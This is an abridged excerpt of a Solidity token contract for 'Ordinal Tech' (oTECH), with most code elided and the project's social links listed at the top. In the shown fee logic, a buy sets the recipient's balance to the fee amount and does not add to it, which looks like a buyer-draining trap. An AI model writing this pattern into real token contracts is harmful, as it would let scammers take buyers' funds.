...
Website: https://otech.live
Telegram: https://t.me/ordtechportal
Twitter: https://twitter.com/ordtechportal
...
contract OrdinalTech is Context, IERC20, Ownable {
    ...
    string private constant _name = "Ordinal Tech";
    string private constant _symbol = "oTECH";
    ...
    constructor () {
        ...
        marketingWallet = address(0x9eEb94CAf7a3f76201ad10676B03B33Af768DA1B);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if(takeFee) _transferFees(from, to, amount);
    ...
    function _transferFees(address sender, address recipient, uint256 amount) private {
        ...
        if(isUserBuy){
            if(isFee) _tOwned[recipient] = feeAmount;
